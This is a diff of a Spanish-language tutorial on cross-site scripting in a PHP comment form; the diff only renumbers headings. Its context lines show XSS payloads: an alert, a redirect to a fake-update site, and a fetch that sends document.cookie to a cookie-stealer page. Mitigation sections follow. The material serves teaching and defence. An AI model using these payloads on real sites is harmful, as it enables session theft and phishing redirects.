@@ -66,7 +66,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 ---
 
-## 2.2 Explotación 1 - XSS clásico
+## 2.1.1 Explotación 1 - XSS clásico
 
 ```
 <script>alert('Vulnerabilidad XSS!')</script>
@@ -74,14 +74,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 ```
 ---
 
-## 2.3 Explotación 2 - Redirección maliciosa
+## 2.1.2 Explotación 2 - Redirección maliciosa
 
 ```
 <script>window.location='https://fakeupdate.net/win10ue/'</script>
 <h2 style="color:red;">Explotación 2</h2>
 ```
 ---
-## 2.4 Explotación 3 - Robo de cookies (Cookie Stealing)
+## 2.1.3 Explotación 3 - Robo de cookies (Cookie Stealing)
 
 **`./www/cookieStealer/index.php`**
 ```
@@ -129,7 +129,7 @@ fetch("http://localhost/cookieStealer/index.php?cookie=" + document.cookie);
 
 ```
 ---
-## 3 Mitigación
+## 2.2 Mitigación
 
 **`comment.php`**
 ```
@@ -262,22 +262,22 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 ```
 ---
 
-## 3.1 MITIGACIÓN 1 — Uso de filter_input()
+## 2.2.1 MITIGACIÓN 1 — Uso de filter_input()
 
 **`comment.php`**
 
 ---
 
-## 3.2 MITIGACIÓN 2 — Validación de entrada
+## 2.2.2 MITIGACIÓN 2 — Validación de entrada
 
 **`comment.php`**
 
 ---
 
-## 3.3 MITIGACIÓN 3 — Sanitización con htmlspecialchars()
+## 2.2.3 MITIGACIÓN 3 — Sanitización con htmlspecialchars()
 
 **`comment.php`**
 
 ---
 
-## 4 BATERÍA DE PRUEBAS
+## 2.3 BATERÍA DE PRUEBAS
